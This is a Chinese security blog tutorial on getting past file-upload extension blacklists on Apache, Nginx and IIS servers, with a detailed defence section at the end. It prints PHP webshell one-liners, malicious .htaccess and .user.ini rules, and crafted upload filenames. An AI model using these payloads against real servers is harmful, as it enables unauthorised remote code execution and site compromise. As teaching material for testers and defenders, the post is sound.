---
title: 文件上传漏洞：后缀名绕过大全
date: 2024-10-15 00:11:23
tags:
  - Web安全
  - 渗透测试
description: 文件上传漏洞——后缀名黑名单绕过：php3/phtml/.htaccess/::$DATA 等技巧。
categories: 渗透测试
---

## 前言

文件上传漏洞是 Web 安全中最高危的漏洞之一。开发者通常通过**黑名单**机制限制上传文件后缀名，但黑名单存在大量绕过手段。本文系统梳理实战中可用的后缀名绕过技巧，涵盖 Windows / Linux 平台及 Apache / Nginx / IIS 等主流服务器。

> **免责声明**：本文技术仅供安全研究与授权测试使用，禁止用于非法入侵，使用者自行承担法律责任。

---

## 一、替代可解析后缀

当服务器仅禁止 `.php` 时，可尝试以下 PHP 仍可解析的后缀：

| 后缀 | 说明 |
|------|------|
| `.php3` | PHP 3 后缀，主流环境默认解析 |
| `.php4` / `.php5` | PHP 4/5 后缀 |
| `.php7` / `.php8` | PHP 7/8 后缀 |
| `.phtml` | Apache 常见配置中作为 PHP 解析 |
| `.pht` | PHP 相关后缀 |
| `.phar` | PHP Archive，可执行 PHP 代码 |
| `.phps` | PHP Source，部分配置下解析 |
| `.shtml` | SSI，可包含 PHP |
| `.cgi` | CGI 脚本，配置不当可执行 PHP |
| `.inc` | Include 文件，直接访问可能执行 |

**实战示例：**

```php
// shell.phtml — 上传后直接解析
<?php @eval($_POST['cmd']); ?>
```

前端 MIME 检查同样可绕：将 Content-Type 改为 `image/jpeg` 即可。

---

## 二、大小写混写绕过

黑名单通常用 `strtolower()` 转换后比对，但如果服务器端未统一处理，大小写可直接绕过（尤其 Windows 文件系统不区分大小写）：

```
shell.pHp    → 仍解析为 PHP
shell.PhP5   → 大小写混写 + 替代后缀组合
shell.PHp    → 多种变体
```

**有缺陷的黑名单代码：**

```php
$blacklist = ['php', 'php5', 'phtml'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (in_array($ext, $blacklist)) die("禁止上传");
// pHp 即可绕过
```

**修复：** 加入 `$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));`

---

## 三、Windows 特性绕过

### 3.1 末尾加点和空格

Windows 文件系统保存文件时会**自动去除**文件名末尾的点（`.`）和空格：

```
shell.php.    → 保存后变 shell.php
shell.php     → (末尾空格) 保存后变 shell.php
shell.php. .  → 点空格组合
```

Burp 抓包修改 filename 即可实现。

### 3.2 NTFS 备用数据流 ::$DATA

Windows NTFS 的 `::$DATA` 指向文件主数据流，文件操作时会被忽略：

```
shell.php::$DATA   → 保存后去掉 ::$DATA
shell.php::$DATA.  → 与点号组合
```

此技巧仅适用于 Windows + NTFS。

---

## 四、双后缀与解析顺序

### 4.1 Apache 从右向左解析

Apache 按从右向左顺序解析扩展名，遇到不认识的继续向左匹配：

```
shell.php.xxx   → xxx 不识别 → 匹配 .php → 作为 PHP 执行
shell.php.jpg   → 同理
```

前提：Apache 配置了 `AddHandler` 或 `AddType` 用于 PHP。

### 4.2 Nginx + PHP-FPM 路径解析

Nginx 配置不当可引发路径解析问题：

```
GET /upload/shell.jpg/1.php HTTP/1.1
```

Nginx 将此请求交给 PHP-FPM，`1.php` 不存在时 PHP-FPM 回退解析 `shell.jpg`，导致代码执行。

---

## 五、Apache .htaccess 与 .user.ini

### 5.1 .htaccess 覆盖解析规则

若目标允许上传 `.htaccess` 且开启 `AllowOverride`：

```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

上传后同目录下所有 `.jpg` 均作为 PHP 执行。

**组合攻击**：先传 `.htaccess` 写入上述规则，再传 `shell.jpg`，访问即执行。

### 5.2 .user.ini（PHP-FPM）

PHP-FPM + Nginx 下，`.user.ini` 可实现类似效果：

```ini
auto_prepend_file=shell.jpg
```

任意 PHP 文件被访问时，`shell.jpg` 自动包含执行。

---

## 六、IIS 6.0 解析漏洞

### 6.1 分号截断

文件名中分号后内容被截断：

```
shell.asp;.jpg   → IIS 6.0 认为扩展名是 .asp
shell.php;.txt   → 被当作 .php 执行
```

### 6.2 目录解析

目录名含 `.asp` 时，其下所有文件被当作 ASP 解析：

```
/upload.asp/shell.jpg  → shell.jpg 作为 ASP 执行
```

---

## 七、文件头与图片马

### 7.1 GIF 文件头伪造

`getimagesize()` 仅读取文件头，伪造 GIF 头即可绕过：

```http
Content-Type: image/gif

GIF89a
<?php system($_GET['cmd']); ?>
```

### 7.2 图片马 + 文件包含

将 PHP 代码写入图片 EXIF 或尾部，配合文件包含漏洞执行。即使上传目录禁止 PHP 解析，若应用存在 `include($_GET['file'])` 类漏洞，攻击者仍可包含图片马实现 RCE。

---

## 八、其他技巧

### 8.1 空字节截断（历史漏洞）

PHP < 5.3.4 存在空字节截断：

```
shell.php%00.jpg   → 保存为 shell.php
```

### 8.2 换行截断

老系统对文件名换行符处理不当：

```
shell.php%0a.jpg
shell.php%0d%0a.jpg
```

### 8.3 Content-Type 伪造

`$_FILES['file']['type']` 由客户端提供，可任意篡改。绝不可作为安全判断依据。

---

## 九、绕过技巧汇总检查表

| 编号 | 技巧 | 适用环境 | 难度 | 可靠性 |
|------|------|----------|------|--------|
| 1 | 替代后缀 (phtml/pht/phar/php5 等) | Apache/Nginx/IIS + PHP | 低 | 高 |
| 2 | 大小写混写 (pHp/PhP) | Windows + 任何服务器 | 低 | 高 |
| 3 | 末尾加点 (shell.php.) | Windows | 低 | 高 |
| 4 | 末尾加空格 | Windows | 低 | 高 |
| 5 | `::$DATA` 流 | Windows NTFS | 中 | 中 |
| 6 | 点与空格组合 | Windows | 低 | 高 |
| 7 | 双后缀 (shell.php.jpg) | Apache | 低 | 中 |
| 8 | 路径解析 (shell.jpg/1.php) | Nginx 配置错误 | 中 | 低 |
| 9 | `.htaccess` 覆盖 | Apache + AllowOverride | 中 | 高 |
| 10 | `.user.ini` 包含 | PHP-FPM | 中 | 高 |
| 11 | IIS 分号截断 | IIS 6.0 | 低 | 高 |
| 12 | IIS 目录解析 | IIS 6.0 | 低 | 高 |
| 13 | 空字节截断 (%00) | PHP < 5.3.4 | 已修复 | 已修复 |
| 14 | 换行截断 (%0a/%0d%0a) | 老旧系统 | 高 | 低 |
| 15 | 图片马 + 文件包含 | 存在文件包含漏洞 | 中 | 高 |
| 16 | Content-Type 伪造 | 仅前端/浅层校验 | 低 | 中 |
| 17 | GIF 文件头伪造 | 有 getimagesize() 检查 | 低 | 高 |

---

## 十、常见陷阱

- **仅前端校验**：JavaScript 校验完全不可信，Burp 抓包修改即可绕过。
- **信任 `$_FILES['type']`**：客户端提供，可任意伪造。
- **黑名单不完整**：仅禁 `['php','asp','jsp']` 形同虚设，至少 10+ 种可执行后缀需覆盖。
- **`getimagesize()` 局限**：仅读取文件头，伪造 GIF 头即可绕过。
- **未限制上传目录执行权限**：即使 Webshell 上传成功，若目录禁止脚本执行，攻击无法得逞——这是重要深度防御手段。

---

## 十一、防御建议

**1. 使用白名单而非黑名单：**

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die("不允许的文件类型");
```

**2. 重命名上传文件**（最彻底的手段）：

```php
$new_name = md5(uniqid() . rand(1, 9999)) . '.' . $ext;
move_uploaded_file($tmp, $upload_dir . $new_name);
```

**3. 文件内容重建**——对图片使用 ImageMagick 或 GD 库重建，剥离恶意代码：

```php
$img = imagecreatefromjpeg($file);
imagejpeg($img, $dest, 90);
imagedestroy($img);
```

**4. 上传目录隔离**：
- 设置在 Web 根目录外
- 配置禁止脚本执行
- 使用独立域名/CDN 提供访问

**5. Nginx 配置加固**：

```nginx
location ~ \.php$ {
    try_files $uri =404;   # 确保文件真实存在
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

**6. Apache 配置加固**：

```apache
<Directory "/var/www/html/upload">
    php_admin_flag engine off
    Options -ExecCGI
    AllowOverride None        # 禁止 .htaccess 覆盖
</Directory>
```

---

## 十二、总结

文件上传后缀绕过本质是对服务器、操作系统、中间件特性的利用。防御方应：

1. **从白名单出发**，不试图穷举黑名单
2. **不信任任何用户输入**：文件名、MIME 类型、文件内容
3. **深度防御**：多层校验 + 隔离存储 + 执行权限禁用
4. **定期审计**上传日志，发现异常行为

理解攻击手法是构建防御体系的第一步。

---

*本文首发于安全研究博客，仅供学习交流。欢迎在授权环境中测试验证。*
